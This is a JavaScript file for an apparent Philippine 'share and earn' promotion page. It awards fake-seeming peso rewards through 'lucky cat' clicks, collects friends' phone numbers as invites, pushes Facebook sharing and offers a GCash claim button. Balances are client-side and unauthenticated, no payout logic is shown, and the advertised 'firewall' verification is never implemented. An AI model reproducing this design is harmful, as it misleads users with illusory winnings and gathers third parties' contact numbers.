// ========== PROMOTION.JS - SHARE AND EARN ==========
// Firebase for shared data (no Auth), localStorage for cache
// Complete with Firewall ON/OFF logic and 4-digit verification

// ========== FIREWALL VERIFICATION VARIABLES ==========
var currentVerificationCode = null;
var verificationAttempts = 0;
var isVerificationModalOpen = false;

// ========== LOCALSTORAGE KEYS ==========
function getUserStorageKeys() {
    var phone = localStorage.getItem("userPhone");
    if (!phone) return null;
    return {
        phone: phone,
        balanceKey: "userBalance_" + phone,
        leftRewardKey: "leftReward_" + phone,
        invitesKey: "invitations_" + phone,
        invitesCountKey: "invitesCount_" + phone,
        rightRewardKey: "rightReward_" + phone
    };
}

// ========== FIREBASE REFERENCE ==========
function getUserRef() {
    var phone = localStorage.getItem("userPhone");
    if (!phone || typeof firebase === 'undefined') return null;
    var db = firebase.database();
    return db.ref('lucky_drop_users/' + phone);
}



// ========== LOAD USER DATA FROM FIREBASE ==========
async function loadUserDataFromFirebase() {
    var keys = getUserStorageKeys();
    if (!keys) return;
    
    var userRef = getUserRef();
    if (!userRef) return;
    
    try {
        var snap = await userRef.once('value');
        
        if (snap.exists()) {
            var data = snap.val();
            console.log("Data from Firebase:", data);
            
            if (data.balance !== undefined) {
                localStorage.setItem(keys.balanceKey, data.balance);
            }
            if (data.leftRewardClaimed !== undefined) {
                localStorage.setItem(keys.leftRewardKey, data.leftRewardClaimed ? 'true' : 'false');
            }
            if (data.rightRewardAvailable !== undefined) {
                localStorage.setItem(keys.rightRewardKey, data.rightRewardAvailable);
                updateRightRewardDisplay();
            }
            displayBalance();
        } else {
            await userRef.set({
                phone: keys.phone,
                balance: 0,
                leftRewardClaimed: false,
                leftRewardAmount: 0,
                rightRewardAvailable: 0,
                rightRewardClaimed: 0,
                totalInvites: 0,
                acceptedInvites: 0,
                createdAt: Date.now(),
                lastUpdate: Date.now()
            });
            console.log("Created new user in Firebase");
            saveBalance(0);
        }
    } catch(e) {
        console.log("Firebase error:", e);
        displayBalance();
    }
}

// ========== SAVE BALANCE TO FIREBASE ==========
async function saveBalanceToFirebase(amount) {
    var userRef = getUserRef();
    if (!userRef) return;
    try {
        await userRef.update({
            balance: amount,
            lastUpdate: Date.now()
        });
        console.log("Balance saved to Firebase:", amount);
    } catch(e) {
        console.log("Firebase save error:", e);
    }
}

// ========== BALANCE FUNCTIONS ==========
function saveBalance(amount) {
    var keys = getUserStorageKeys();
    if (!keys) return;
    localStorage.setItem(keys.balanceKey, amount);
    saveBalanceToFirebase(amount);
}

function getBalance() {
    var keys = getUserStorageKeys();
    if (!keys) return 0;
    var balance = localStorage.getItem(keys.balanceKey);
    return balance ? parseInt(balance) : 0;
}

function addBalance(amount) {
    var currentBalance = getBalance();
    var newBalance = currentBalance + amount;
    
    if (newBalance > 1200) {
        alert("Maximum balance of ₱1200 reached!");
        return currentBalance;
    }
    
    saveBalance(newBalance);
    return newBalance;
}

function displayBalance() {
    var balance = getBalance();
    var balanceSpan = document.getElementById('userBalanceDisplay');
    if (balanceSpan) balanceSpan.innerHTML = '₱' + balance;
}

// ========== LEFT REWARD STATUS ==========
async function saveLeftRewardToFirebase(claimed) {
    var userRef = getUserRef();
    if (!userRef) return;
    try {
        await userRef.update({
            leftRewardClaimed: claimed,
            leftRewardAmount: claimed ? 150 : 0,
            leftRewardClaimedAt: claimed ? Date.now() : null
        });
        console.log("Left reward saved to Firebase:", claimed);
    } catch(e) {
        console.log("Firebase save error:", e);
    }
}

function saveLeftRewardClaimed(claimed) {
    var keys = getUserStorageKeys();
    if (!keys) return;
    localStorage.setItem(keys.leftRewardKey, claimed ? 'true' : 'false');
    saveLeftRewardToFirebase(claimed);
}

function getLeftRewardClaimed() {
    var keys = getUserStorageKeys();
    if (!keys) return false;
    var claimed = localStorage.getItem(keys.leftRewardKey);
    return claimed === 'true';
}

// ========== RIGHT REWARD FUNCTIONS ==========
function updateRightRewardDisplay() {
    var keys = getUserStorageKeys();
    if (!keys) return;
    var rightAmount = localStorage.getItem(keys.rightRewardKey);
    var rightAmountSpan = document.getElementById('rightRewardAmount');
    if (rightAmountSpan) {
        rightAmountSpan.innerHTML = '₱' + (rightAmount ? parseInt(rightAmount) : 0);
    }
}

function addRightReward(amount) {
    var keys = getUserStorageKeys();
    if (!keys) return;
    var current = localStorage.getItem(keys.rightRewardKey);
    var currentAmount = current ? parseInt(current) : 0;
    var newAmount = currentAmount + amount;
    localStorage.setItem(keys.rightRewardKey, newAmount);
    updateRightRewardDisplay();
    return newAmount;
}

function claimRightReward() {
    var keys = getUserStorageKeys();
    if (!keys) return 0;
    var available = localStorage.getItem(keys.rightRewardKey);
    var availableAmount = available ? parseInt(available) : 0;
    if (availableAmount <= 0) return 0;
    addBalance(availableAmount);
    localStorage.setItem(keys.rightRewardKey, 0);
    updateRightRewardDisplay();
    return availableAmount;
}

// ========== INVITATION FUNCTIONS ==========
function getInvitations() {
    var keys = getUserStorageKeys();
    if (!keys) return [];
    var invites = localStorage.getItem(keys.invitesKey);
    return invites ? JSON.parse(invites) : [];
}

function saveInvitations(invitations) {
    var keys = getUserStorageKeys();
    if (!keys) return;
    localStorage.setItem(keys.invitesKey, JSON.stringify(invitations));
    localStorage.setItem(keys.invitesCountKey, invitations.length);
}

function addInvitation(friendPhone) {
    var invitations = getInvitations();
    for (var i = 0; i < invitations.length; i++) {
        if (invitations[i].phone === friendPhone) return false;
    }
    invitations.push({
        phone: friendPhone,
        status: 'pending',
        timestamp: Date.now()
    });
    saveInvitations(invitations);
    return true;
}

function deleteInvitationByPhone(friendPhone) {
    var invitations = getInvitations();
    var newInvites = [];
    for (var i = 0; i < invitations.length; i++) {
        if (invitations[i].phone !== friendPhone) newInvites.push(invitations[i]);
    }
    saveInvitations(newInvites);
}

function getInvitesCount() {
    var keys = getUserStorageKeys();
    if (!keys) return 0;
    var count = localStorage.getItem(keys.invitesCountKey);
    return count ? parseInt(count) : 0;
}

function displayInvitesCount() {
    var count = getInvitesCount();
    var invitesSpan = document.getElementById('invitesCountDisplay');
    if (invitesSpan) invitesSpan.innerHTML = count + ' / 6';
    return count;
}

// ========== RENDER INVITATIONS ==========
function renderInvitationsFromStorage() {
    var invitations = getInvitations();
    var listBody = document.getElementById('inviteListBody');
    if (!listBody) return;
    
    if (invitations.length === 0) {
        listBody.innerHTML = '<div class="invite-empty">No invitations sent</div>';
        return;
    }
    
    var html = '';
    for (var i = 0; i < invitations.length; i++) {
        var inv = invitations[i];
        var formattedPhone = formatPhoneWithAsterisk(inv.phone);
        var statusClass = inv.status === 'approved' ? 'approved' : 'pending';
        var statusText = inv.status === 'approved' ? 'APPROVED' : 'PENDING';
        var disabled = inv.status === 'approved' ? 'disabled' : '';
        
        html += '<div class="invite-item">';
        html += '<div class="invite-item-phone">' + formattedPhone + '</div>';
        html += '<div class="invite-item-status"><span class="status-badge ' + statusClass + '">' + statusText + '</span></div>';
        html += '<div class="invite-item-action">';
        html += '<button class="delete-invite" onclick="deleteInviteFromStorage(\'' + inv.phone + '\')" ' + disabled + '>✕</button>';
        html += '</div>';
        html += '</div>';
    }
    listBody.innerHTML = html;
}

window.sendInviteToStorage = function() {
    var friendPhone = document.getElementById('friendPhoneInput').value.trim();
    var userPhone = localStorage.getItem("userPhone");
    
    if (!friendPhone || friendPhone.length !== 11 || !friendPhone.startsWith('09')) {
        alert("Enter valid 11-digit number starting with 09");
        return;
    }
    if (friendPhone === userPhone) {
        alert("You cannot invite yourself!");
        return;
    }
    if (getInvitesCount() >= 6) {
        alert("Maximum 6 invites only!");
        return;
    }
    if (addInvitation(friendPhone)) {
        document.getElementById('friendPhoneInput').value = '';
        renderInvitationsFromStorage();
        displayInvitesCount();
        alert("Invitation sent to " + formatPhoneWithAsterisk(friendPhone));
    } else {
        alert("You already invited this person!");
    }
};

window.deleteInviteFromStorage = function(friendPhone) {
    var invitations = getInvitations();
    var invite = null;
    for (var i = 0; i < invitations.length; i++) {
        if (invitations[i].phone === friendPhone) { invite = invitations[i]; break; }
    }
    if (invite && invite.status === 'approved') {
        alert("Cannot delete approved invitation!");
        return;
    }
    if (confirm("Delete invitation?")) {
        deleteInvitationByPhone(friendPhone);
        renderInvitationsFromStorage();
        displayInvitesCount();
    }
};

// ========== FORMAT PHONE ==========
function formatPhoneWithAsterisk(phone) {
    if (!phone || phone.length !== 11) return phone;
    var first4 = phone.substring(0, 4);
    var last4 = phone.substring(7, 11);
    return first4 + '***' + last4;
}

// ========== UPDATE LEFT CARD VISUAL ==========
function updateLeftCardFromStorage() {
    var leftCard = document.getElementById('leftCard');
    if (!leftCard) return;
    if (getLeftRewardClaimed()) {
        leftCard.classList.add('prize-card-claimed');
        leftCard.classList.remove('prize-card-glow');
        leftCard.style.cursor = 'default';
    } else {
        leftCard.classList.add('prize-card-glow');
        leftCard.classList.remove('prize-card-claimed');
        leftCard.style.cursor = 'pointer';
    }
}

// ========== ACTIVATE RIGHT LUCKY CAT ==========
function activateRightLuckyCat() {
    var rightCard = document.getElementById('rightCard');
    if (!rightCard) return;
    var keys = getUserStorageKeys();
    if (!keys) return;
    var rightAmount = localStorage.getItem(keys.rightRewardKey);
    var amount = rightAmount ? parseInt(rightAmount) : 0;
    
    if (amount > 0) {
        rightCard.classList.add('prize-card-pulse');
        rightCard.style.cursor = 'pointer';
        updateRightRewardDisplay();
    } else {
        rightCard.classList.remove('prize-card-pulse');
        rightCard.style.cursor = 'default';
    }
}

// ========== CONFETTI ==========
var confettiAnimation = null;
var confettiTimeout = null;

function startConfetti() {
    var canvas = document.getElementById('confettiCanvas');
    if (!canvas) return;
    stopConfetti();
    canvas.style.display = 'block';
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    var ctx = canvas.getContext('2d');
    var particles = [];
    for (var i = 0; i < 100; i++) {
        particles.push({
            x: Math.random() * canvas.width,
            y: Math.random() * canvas.height - canvas.height,
            size: Math.random() * 6 + 2,
            color: "hsl(" + (Math.random() * 360) + ", 100%, 60%)",
            speed: Math.random() * 3 + 2
        });
    }
    function draw() {
        if (!canvas || canvas.style.display === 'none') return;
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        for (var j = 0; j < particles.length; j++) {
            var p = particles[j];
            ctx.fillStyle = p.color;
            ctx.fillRect(p.x, p.y, p.size, p.size);
            p.y += p.speed;
            if (p.y > canvas.height) {
                p.y = -p.size;
                p.x = Math.random() * canvas.width;
            }
        }
        confettiAnimation = requestAnimationFrame(draw);
    }
    draw();
    if (confettiTimeout) clearTimeout(confettiTimeout);
    confettiTimeout = setTimeout(stopConfetti, 3000);
}

function stopConfetti() {
    if (confettiAnimation) {
        cancelAnimationFrame(confettiAnimation);
        confettiAnimation = null;
    }
    var canvas = document.getElementById('confettiCanvas');
    if (canvas) {
        var ctx = canvas.getContext('2d');
        if (ctx) ctx.clearRect(0, 0, canvas.width, canvas.height);
        canvas.style.display = 'none';
    }
}

// ========== FLOATING ANIMATION ==========
function showFloatingPlus(x, y, amount) {
    var floatingDiv = document.createElement('div');
    floatingDiv.className = 'floating-plus';
    floatingDiv.innerHTML = '+₱' + amount;
    floatingDiv.style.position = 'fixed';
    floatingDiv.style.left = x + 'px';
    floatingDiv.style.top = y + 'px';
    floatingDiv.style.color = '#ffd700';
    floatingDiv.style.fontSize = '36px';
    floatingDiv.style.fontWeight = 'bold';
    floatingDiv.style.fontFamily = 'Orbitron, monospace';
    floatingDiv.style.textShadow = '0 0 15px #ffaa33';
    floatingDiv.style.pointerEvents = 'none';
    floatingDiv.style.zIndex = '10001';
    floatingDiv.style.animation = 'floatUp 1s ease-out forwards';
    document.body.appendChild(floatingDiv);
    setTimeout(function() { floatingDiv.remove(); }, 1000);
}

// ========== LEFT LUCKY CAT ==========
function initLeftLuckyCard() {
    var leftCard = document.getElementById('leftCard');
    if (!leftCard) return;
    
    var luckySound = new Audio('sounds/luckycat.mp4');
    luckySound.loop = false;
    luckySound.volume = 0.7;
    
    updateLeftCardFromStorage();
    
    if (!getLeftRewardClaimed()) {
        leftCard.addEventListener('click', function(e) {
            e.stopPropagation();
            if (getLeftRewardClaimed()) {
                alert("You already claimed your ₱150!");
                return;
            }
            luckySound.currentTime = 0;
            luckySound.play().catch(function(err) { console.log("Audio error:", err); });
            
            var rect = this.getBoundingClientRect();
            var x = rect.left + rect.width / 2;
            var y = rect.top + rect.height / 2;
            var newBalance = addBalance(150);
            saveLeftRewardClaimed(true);
            
            this.classList.remove('prize-card-glow');
            this.classList.add('prize-card-claimed');
            this.style.cursor = 'default';
            showFloatingPlus(x, y, 150);
            startConfetti();
            displayBalance();
            
            var statusMsg = document.getElementById('statusMessage');
            if (statusMsg) {
                statusMsg.innerHTML = '<span class="status-locked">🐱 <strong style="color:#ffd700;">+₱150 CLAIMED!</strong> Your balance: <strong style="color:#ffd700;">₱' + newBalance + '</strong> ✨</span>';
                setTimeout(function() {
                    statusMsg.innerHTML = '<span class="status-locked">🐱 Click the <strong>Maneki-neko</strong> to claim <strong style="color:#ffd700;">₱150!</strong> ✨</span>';
                }, 4000);
            }
        });
    }
}

// ========== RIGHT LUCKY CAT ==========
function initRightLuckyCat() {
    var rightCard = document.getElementById('rightCard');
    if (!rightCard) return;
    activateRightLuckyCat();
    
    rightCard.addEventListener('click', function(e) {
        e.stopPropagation();
        var keys = getUserStorageKeys();
        if (!keys) return;
        var available = localStorage.getItem(keys.rightRewardKey);
        var availableAmount = available ? parseInt(available) : 0;
        
        if (availableAmount <= 0) {
            alert("No rewards available! Invite friends to earn ₱150 each.");
            return;
        }
        
        var currentBalance = getBalance();
        if (currentBalance >= 1200) {
            alert("Maximum balance of ₱1200 reached!");
            return;
        }
        
        var rect = this.getBoundingClientRect();
        var x = rect.left + rect.width / 2;
        var y = rect.top + rect.height / 2;
        var claimedAmount = claimRightReward();
        
        showFloatingPlus(x, y, claimedAmount);
        startConfetti();
        displayBalance();
        
        this.classList.remove('prize-card-pulse');
        this.classList.add('prize-card-claimed');
        this.style.cursor = 'default';
        updateRightRewardDisplay();
        
        var statusMsg = document.getElementById('statusMessage');
        if (statusMsg) {
            statusMsg.innerHTML = '<span class="status-locked">🐱 <strong style="color:#ffd700;">+₱' + claimedAmount + ' CLAIMED!</strong> Your balance: <strong style="color:#ffd700;">₱' + getBalance() + '</strong> ✨</span>';
            setTimeout(function() {
                statusMsg.innerHTML = '<span class="status-locked">🐱 Click the <strong>Maneki-neko</strong> to claim <strong style="color:#ffd700;">₱150!</strong> ✨</span>';
            }, 4000);
        }
    });
}

// ========== CLAIM NOW BUTTON ==========
function initClaimNowButton() {
    var claimNowBtn = document.getElementById('claimNowBtn');
    if (claimNowBtn) {
        var newBtn = claimNowBtn.cloneNode(true);
        claimNowBtn.parentNode.replaceChild(newBtn, claimNowBtn);
        claimNowBtn = newBtn;

        claimNowBtn.innerHTML = '';
        
        var icon = document.createElement('img');
        icon.src = 'images/scatter_icon.jpg';
        icon.className = 'claim-icon';
        icon.style.width = '24px';
        icon.style.height = '24px';
        icon.style.marginRight = '8px';
        icon.style.transition = 'transform 0.3s ease';
        
        claimNowBtn.appendChild(icon);
        claimNowBtn.appendChild(document.createTextNode(' CLAIM NOW!!'));
        
        claimNowBtn.onclick = function(e) {
            e.preventDefault();
            claimNowBtn.disabled = true;
            claimNowBtn.style.opacity = '0.7';
            claimNowBtn.style.cursor = 'wait';
            icon.style.transform = 'rotate(360deg)';
            
            setTimeout(function() {
                icon.style.transform = '';
                claimNowBtn.disabled = false;
                claimNowBtn.style.opacity = '1';
                claimNowBtn.style.cursor = 'pointer';
                showPrizePopup();
            }, 1500);
        };
    }
}

// ========== POPUP FUNCTIONS ==========
function showPrizePopup() {
    var popup = document.getElementById('prizePopup');
    if (popup) {
        popup.style.display = 'flex';
        startConfetti();
    }
}

function closePrizePopup() {
    window.location.reload();
}

// ========== FACEBOOK SHARE ==========
function initFacebookShare() {
    var fbBtn = document.getElementById('shareFBBtn');
    if (fbBtn) {
        fbBtn.innerHTML = '';
        
        var fbIcon = document.createElement('img');
        fbIcon.src = 'images/fb_icon.png';
        fbIcon.style.width = '18px';
        fbIcon.style.height = '18px';
        fbIcon.style.marginRight = '8px';
        fbIcon.style.verticalAlign = 'middle';
        
        // Para maalis ang white background
        fbIcon.style.backgroundColor = 'transparent';
        
        fbBtn.appendChild(fbIcon);
        fbBtn.appendChild(document.createTextNode(' Share on Facebook'));
        
        fbBtn.onclick = function() {
            var shareUrl = "https://xjiligames.github.io/rewards/index.html";
            window.open('https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent(shareUrl), '_blank', 'width=600,height=500');
        };
    }
}


// ========== CLAIM THRU GCASH BUTTON - SIMPLE TRIGGER ==========
function initClaimButton() {
    var claimBtn = document.getElementById('claimGCashBtn');
    if (claimBtn) {
        claimBtn.onclick = function() {
            if (typeof window.showClaimPopupShare === 'function') {
                window.showClaimPopupShare(150);
            } else {
                alert("System loading. Please refresh.");
            }
        };
    }
}

// ========== INITIALIZE ==========
document.addEventListener('DOMContentLoaded', function() {
    console.log("Promotion.js loading...");
    
    var userPhone = localStorage.getItem("userPhone");
    if (!userPhone) {
        alert("Please login first.");
        window.location.href = "index.html";
        return;
    }
    
    console.log("User phone:", userPhone);
    
    var display = document.getElementById('userPhoneDisplay');
    if (display) {
        display.innerText = userPhone.substring(0, 4) + '****' + userPhone.substring(8, 11);
    }
    
    loadUserDataFromFirebase().then(function() {
        console.log("Data loaded from Firebase");
    });
    
    displayInvitesCount();
    updateLeftCardFromStorage();
    renderInvitationsFromStorage();
    activateRightLuckyCat();
    
    initLeftLuckyCard();
    initRightLuckyCat();
    initClaimNowButton();
    initClaimButton();
    initFacebookShare();
    
    var sendBtn = document.getElementById('sendInviteBtn');
    if (sendBtn) {
        var newSendBtn = sendBtn.cloneNode(true);
        sendBtn.parentNode.replaceChild(newSendBtn, sendBtn);
        newSendBtn.onclick = window.sendInviteToStorage;
    }
    
    console.log("Promotion.js ready");
});
